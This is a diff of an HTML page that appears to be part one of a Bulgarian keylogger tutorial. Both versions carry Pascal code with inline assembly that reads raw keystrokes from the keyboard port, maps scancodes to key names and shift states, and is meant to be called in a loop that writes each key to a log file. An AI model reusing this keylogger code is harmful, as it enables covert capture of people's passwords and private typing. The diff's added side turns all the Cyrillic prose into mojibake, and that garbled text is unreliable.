@@ -1,141 +1,141 @@
-<html>
-<head>
-<title>Keylogger - Keyloggin'</title>
-<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
-</head>
-
-<body bgcolor="#666666" text="#CCCCCC" link="#FFFFFF" vlink="#0000CC" alink="#0000FF">
-<p><font face="Courier New, Courier, mono">Започваме със основата - как хващаме 
-  копчето :</font></p>
-<table width="100%" border="1">
-  <tr> 
-    <td bgcolor="#000099"> 
-      <p><font face="Courier New, Courier, mono" color="#CCCCCC">{nujnite za primera 
-        globalni promenlivi}</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
-        <font color="#FFFFFF">var</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
-        </font></font> <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;Key, 
-        OldKey: Byte;<br>
-        &nbsp;&nbsp;LShiftUp, RShiftUp: Boolean;<br>
-        &nbsp;&nbsp;St: <font color="#FFFFFF">string</font>;</font></p>
-      <p> <font face="Courier New, Courier, mono" color="#CCCCCC">{tablici sus 
-        string-ovete za kopchetata}</font><font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00"><br>
-        </font></font><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">const</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
-        </font>&nbsp;&nbsp;</font> <font face="Courier New, Courier, mono" color="#FFFF00"> 
-        Low: <font color="#FFFFFF">array</font>[1..88] of <font color="#FFFFFF">string</font> 
-        = (<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Esc ','1','2','3','4','5','6','7','8','9','0','-','=',' 
-        BkSp ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Tab ','q','w','e','r','t','y','u','i','o','p','[',']',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Enter ',' Ctrl ','a','s','d','f','g','h','j','k','l',';','''','`',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' LShift+ ','\','z','x','c','v','b','n','m',',','.','/',' 
-        RShift+ ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Pad* ',' Alt ',' Space ',' CAPS ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' F1 ',' F2 ',' F3 ',' F4 ',' F5 ',' F6 ',' F7 
-        ',' F8 ',' F9 ',' F10 ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' NUM ',' SCROLL ',' Home ',' Up ',' PgUp ',' 
-        Pad- ',' Left ',' *5* ',' Right ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Pad+ ',' End ',' Down ',' PgDown ',' Ins ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Del ',' -LShift ',' -RShift ',' Unknown ',' 
-        F11 ',' F12 ');</font> </p>
-      <p> <font face="Courier New, Courier, mono" color="#FFFF00"> &nbsp;&nbsp;&nbsp;Hi: 
-        <font color="#FFFFFF">array</font>[1..88] of <font color="#FFFFFF">string</font> 
-        = (<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Esc ','!','@','#','$','%','^','&amp;','*','(',')','_','+',' 
-        BkSp ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Tab ','Q','W','E','R','T','Y','U','I','O','P','{','}',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Enter ',' Ctrl ','A','S','D','F','G','H','J','K','L',':','&quot;','~',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' LShift+ ','|','Z','X','C','V','B','N','M','&lt;','&gt;','?',' 
-        RShift+ ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Pad* ',' Alt ',' Space ',' CAPS ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' F1 ',' F2 ',' F3 ',' F4 ',' F5 ',' F6 ',' F7',' 
-        F8',' F9 ',' F10 ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' NUM ',' SCROLL ',' Home ',' Up ',' PgUp ',' 
-        Pad- ',' Left ',' *5* ',' Right ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Pad+ ',' End ',' Down ',' PgDown ',' Ins ',<br>
-        &nbsp;&nbsp;&nbsp;&nbsp;' Del ',' -LShift ',' -RShift ',' Unknown ',' 
-        F11 ',' F12 ');</font> </p>
-      <font face="Courier New, Courier, mono" color="#CCCCCC">{tova tuk e osnovniq 
-      cikul deto prihvashta novo kopche}</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
-      <font color="#FFFFFF">procedure</font> SpyKey;<br>
-      <font color="#FFFFFF">begin</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
-      </font></font> <font face="Courier New, Courier, mono" color="#FFFF00"> 
-      <font color="#FFFFFF">&nbsp;&nbsp;asm</font><br>
-      <font color="#00FF00">&nbsp;&nbsp;&nbsp;&nbsp;in al, 60h</font> <font color="#CCCCCC">{kopcheto 
-      vuv al}</font><br>
-      <font color="#00FF00">&nbsp;&nbsp;&nbsp;&nbsp;mov Key, al</font> <font color="#CCCCCC">{al 
-      vuv Key}</font><br>
-      <font color="#FFFFFF">&nbsp;&nbsp;end</font>;</font> 
-      <p><font face="Courier New, Courier, mono" color="#FFFF00"> <font color="#CCCCCC">&nbsp;&nbsp;{malko 
-        obrabotka na Key, za da se vidi sustoqnieto na shift}</font><br>
-        <font color="#FFFFFF">&nbsp;&nbsp;if</font> Key = 170 <font color="#FFFFFF">then</font><br>
-        <font color="#FFFFFF">&nbsp;&nbsp;begin</font><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;Key := 84;<br>
-        <font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>LShiftUp 
-        := true;<br>
-        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
-        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
-        Key = 182 <font color="#FFFFFF">then</font><br>
-        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
-        <font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>Key 
-        := 85;<br>
-        <font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>RShiftUp 
-        := true;<br>
-        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
-        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
-        Key = 42 <font color="#FFFFFF">then</font> LShiftUp := false;<br>
-        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
-        Key = 54 <font color="#FFFFFF">then</font> RShiftUp := false;</font> </p>
-      <font face="Courier New, Courier, mono" color="#FFFF00"> <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
-      Key &lt;&gt; OldKey <font color="#FFFFFF">then</font><br>
-      </font> <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{ako 
-      kopcheto e razlichno ot staroto togava...}</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
-      <font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>OldKey:=Key; 
-      <font color="#CCCCCC">{novoto kopche vuv Oldkey}</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
-      Key&lt;=88 <font color="#FFFFFF">then</font> <font color="#CCCCCC">{ako 
-      e natisnato kopche}</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">begin</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
-      LShiftUp <font color="#FFFFFF">and</font> RShiftUp <font color="#FFFFFF">then</font><br>
-      <font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>St:=Low[Key] 
-      <font color="#CCCCCC">{nqma shift</font><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#CCCCCC"> 
-      =&gt; </font></font><font color="#CCCCCC"> vzemi ot tablicata low}</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">else</font> 
-      St:=Hi[Key]; <font color="#CCCCCC">{ima shift =&gt; vzemi ot tablicata hi}</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">end</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">else</font> 
-      <font color="#FFFFFF">if</font> Key - 128 &lt;= 88 <font color="#FFFFFF">then</font> 
-      <font color="#CCCCCC">{ako e otpusnato kopche}</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">begin</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
-      LShiftUp <font color="#FFFFFF">and</font> RShiftUp <font color="#FFFFFF">then</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>St:=Low[Key 
-      - 128] <font color="#CCCCCC">{nqma =&gt; shift vzemi ot tablicata low}</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">else</font> 
-      St:=Hi[Key - 128]; <font color="#CCCCCC">{ima =&gt; shift vzemi ot tablicata 
-      hi}</font><br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font></font><font color="#FFFFFF">end</font>;<br>
-      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
-      </font> <font face="Courier New, Courier, mono" color="#FFFFFF">end</font><font face="Courier New, Courier, mono" color="#FFFF00">;</font> 
-    </td>
-  </tr>
-</table>
-<p><font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font></font><font face="Courier New, Courier, mono">Това 
-  е !! В момента в St имате string-а на натиснатото копче. Задачата е в някакъв 
-  цикъл да извиквате SpyKey и да добавяте копчето във log файла. </font></p>
-<p><font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font></font><font face="Courier New, Courier, mono">Другите 
-  добавки по-нататък...</font></p>
-<table width="100%" border="0">
-  <tr> 
-    <td><font face="Courier New, Courier, mono">назад</font></td>
-    <td> 
-      <div align="center"><font face="Courier New, Courier, mono"><a href="logger.htm#view">начало</a></font></div>
-    </td>
-    <td> 
-      <div align="right"><font face="Courier New, Courier, mono"><a href="log2.htm">напред</a></font></div>
-    </td>
-  </tr>
-</table>
-</body>
-</html>
+<html>
+<head>
+<title>Keylogger - Keyloggin'</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+</head>
+
+<body bgcolor="#666666" text="#CCCCCC" link="#FFFFFF" vlink="#0000CC" alink="#0000FF">
+<p><font face="Courier New, Courier, mono">Р—Р°РїРѕС‡РІР°РјРµ СЃСЉСЃ РѕСЃРЅРѕРІР°С‚Р° - РєР°Рє С…РІР°С‰Р°РјРµ 
+  РєРѕРїС‡РµС‚Рѕ :</font></p>
+<table width="100%" border="1">
+  <tr> 
+    <td bgcolor="#000099"> 
+      <p><font face="Courier New, Courier, mono" color="#CCCCCC">{nujnite za primera 
+        globalni promenlivi}</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
+        <font color="#FFFFFF">var</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
+        </font></font> <font face="Courier New, Courier, mono" color="#FFFF00">&nbsp;&nbsp;Key, 
+        OldKey: Byte;<br>
+        &nbsp;&nbsp;LShiftUp, RShiftUp: Boolean;<br>
+        &nbsp;&nbsp;St: <font color="#FFFFFF">string</font>;</font></p>
+      <p> <font face="Courier New, Courier, mono" color="#CCCCCC">{tablici sus 
+        string-ovete za kopchetata}</font><font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00"><br>
+        </font></font><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">const</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
+        </font>&nbsp;&nbsp;</font> <font face="Courier New, Courier, mono" color="#FFFF00"> 
+        Low: <font color="#FFFFFF">array</font>[1..88] of <font color="#FFFFFF">string</font> 
+        = (<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Esc ','1','2','3','4','5','6','7','8','9','0','-','=',' 
+        BkSp ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Tab ','q','w','e','r','t','y','u','i','o','p','[',']',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Enter ',' Ctrl ','a','s','d','f','g','h','j','k','l',';','''','`',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' LShift+ ','\','z','x','c','v','b','n','m',',','.','/',' 
+        RShift+ ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Pad* ',' Alt ',' Space ',' CAPS ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' F1 ',' F2 ',' F3 ',' F4 ',' F5 ',' F6 ',' F7 
+        ',' F8 ',' F9 ',' F10 ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' NUM ',' SCROLL ',' Home ',' Up ',' PgUp ',' 
+        Pad- ',' Left ',' *5* ',' Right ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Pad+ ',' End ',' Down ',' PgDown ',' Ins ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Del ',' -LShift ',' -RShift ',' Unknown ',' 
+        F11 ',' F12 ');</font> </p>
+      <p> <font face="Courier New, Courier, mono" color="#FFFF00"> &nbsp;&nbsp;&nbsp;Hi: 
+        <font color="#FFFFFF">array</font>[1..88] of <font color="#FFFFFF">string</font> 
+        = (<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Esc ','!','@','#','$','%','^','&amp;','*','(',')','_','+',' 
+        BkSp ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Tab ','Q','W','E','R','T','Y','U','I','O','P','{','}',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Enter ',' Ctrl ','A','S','D','F','G','H','J','K','L',':','&quot;','~',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' LShift+ ','|','Z','X','C','V','B','N','M','&lt;','&gt;','?',' 
+        RShift+ ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Pad* ',' Alt ',' Space ',' CAPS ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' F1 ',' F2 ',' F3 ',' F4 ',' F5 ',' F6 ',' F7',' 
+        F8',' F9 ',' F10 ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' NUM ',' SCROLL ',' Home ',' Up ',' PgUp ',' 
+        Pad- ',' Left ',' *5* ',' Right ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Pad+ ',' End ',' Down ',' PgDown ',' Ins ',<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;' Del ',' -LShift ',' -RShift ',' Unknown ',' 
+        F11 ',' F12 ');</font> </p>
+      <font face="Courier New, Courier, mono" color="#CCCCCC">{tova tuk e osnovniq 
+      cikul deto prihvashta novo kopche}</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
+      <font color="#FFFFFF">procedure</font> SpyKey;<br>
+      <font color="#FFFFFF">begin</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
+      </font></font> <font face="Courier New, Courier, mono" color="#FFFF00"> 
+      <font color="#FFFFFF">&nbsp;&nbsp;asm</font><br>
+      <font color="#00FF00">&nbsp;&nbsp;&nbsp;&nbsp;in al, 60h</font> <font color="#CCCCCC">{kopcheto 
+      vuv al}</font><br>
+      <font color="#00FF00">&nbsp;&nbsp;&nbsp;&nbsp;mov Key, al</font> <font color="#CCCCCC">{al 
+      vuv Key}</font><br>
+      <font color="#FFFFFF">&nbsp;&nbsp;end</font>;</font> 
+      <p><font face="Courier New, Courier, mono" color="#FFFF00"> <font color="#CCCCCC">&nbsp;&nbsp;{malko 
+        obrabotka na Key, za da se vidi sustoqnieto na shift}</font><br>
+        <font color="#FFFFFF">&nbsp;&nbsp;if</font> Key = 170 <font color="#FFFFFF">then</font><br>
+        <font color="#FFFFFF">&nbsp;&nbsp;begin</font><br>
+        &nbsp;&nbsp;&nbsp;&nbsp;Key := 84;<br>
+        <font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>LShiftUp 
+        := true;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        Key = 182 <font color="#FFFFFF">then</font><br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
+        <font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>Key 
+        := 85;<br>
+        <font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>RShiftUp 
+        := true;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        Key = 42 <font color="#FFFFFF">then</font> LShiftUp := false;<br>
+        <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+        Key = 54 <font color="#FFFFFF">then</font> RShiftUp := false;</font> </p>
+      <font face="Courier New, Courier, mono" color="#FFFF00"> <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">if</font> 
+      Key &lt;&gt; OldKey <font color="#FFFFFF">then</font><br>
+      </font> <font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#CCCCCC">{ako 
+      kopcheto e razlichno ot staroto togava...}</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">begin</font><br>
+      <font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>OldKey:=Key; 
+      <font color="#CCCCCC">{novoto kopche vuv Oldkey}</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+      Key&lt;=88 <font color="#FFFFFF">then</font> <font color="#CCCCCC">{ako 
+      e natisnato kopche}</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">begin</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+      LShiftUp <font color="#FFFFFF">and</font> RShiftUp <font color="#FFFFFF">then</font><br>
+      <font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>St:=Low[Key] 
+      <font color="#CCCCCC">{nqma shift</font><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#CCCCCC"> 
+      =&gt; </font></font><font color="#CCCCCC"> vzemi ot tablicata low}</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">else</font> 
+      St:=Hi[Key]; <font color="#CCCCCC">{ima shift =&gt; vzemi ot tablicata hi}</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">end</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">else</font> 
+      <font color="#FFFFFF">if</font> Key - 128 &lt;= 88 <font color="#FFFFFF">then</font> 
+      <font color="#CCCCCC">{ako e otpusnato kopche}</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">begin</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">if</font> 
+      LShiftUp <font color="#FFFFFF">and</font> RShiftUp <font color="#FFFFFF">then</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font>St:=Low[Key 
+      - 128] <font color="#CCCCCC">{nqma =&gt; shift vzemi ot tablicata low}</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">&nbsp;&nbsp;</font><font color="#FFFFFF">else</font> 
+      St:=Hi[Key - 128]; <font color="#CCCCCC">{ima =&gt; shift vzemi ot tablicata 
+      hi}</font><br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font></font><font color="#FFFFFF">end</font>;<br>
+      <font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font><font color="#FFFFFF">end</font>;</font><font face="Courier New, Courier, mono" color="#FFFF00"><br>
+      </font> <font face="Courier New, Courier, mono" color="#FFFFFF">end</font><font face="Courier New, Courier, mono" color="#FFFF00">;</font> 
+    </td>
+  </tr>
+</table>
+<p><font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font></font><font face="Courier New, Courier, mono">РўРѕРІР° 
+  Рµ !! Р’ РјРѕРјРµРЅС‚Р° РІ St РёРјР°С‚Рµ string-Р° РЅР° РЅР°С‚РёСЃРЅР°С‚РѕС‚Рѕ РєРѕРїС‡Рµ. Р—Р°РґР°С‡Р°С‚Р° Рµ РІ РЅСЏРєР°РєСЉРІ 
+  С†РёРєСЉР» РґР° РёР·РІРёРєРІР°С‚Рµ SpyKey Рё РґР° РґРѕР±Р°РІСЏС‚Рµ РєРѕРїС‡РµС‚Рѕ РІСЉРІ log С„Р°Р№Р»Р°. </font></p>
+<p><font face="Courier New, Courier, mono" color="#FFFF00"><font face="Courier New, Courier, mono" color="#FFFF00"><font color="#FFFFFF">&nbsp;&nbsp;</font></font></font><font face="Courier New, Courier, mono">Р”СЂСѓРіРёС‚Рµ 
+  РґРѕР±Р°РІРєРё РїРѕ-РЅР°С‚Р°С‚СЉРє...</font></p>
+<table width="100%" border="0">
+  <tr> 
+    <td><font face="Courier New, Courier, mono">РЅР°Р·Р°Рґ</font></td>
+    <td> 
+      <div align="center"><font face="Courier New, Courier, mono"><a href="logger.htm#view">РЅР°С‡Р°Р»Рѕ</a></font></div>
+    </td>
+    <td> 
+      <div align="right"><font face="Courier New, Courier, mono"><a href="log2.htm">РЅР°РїСЂРµРґ</a></font></div>
+    </td>
+  </tr>
+</table>
+</body>
+</html>
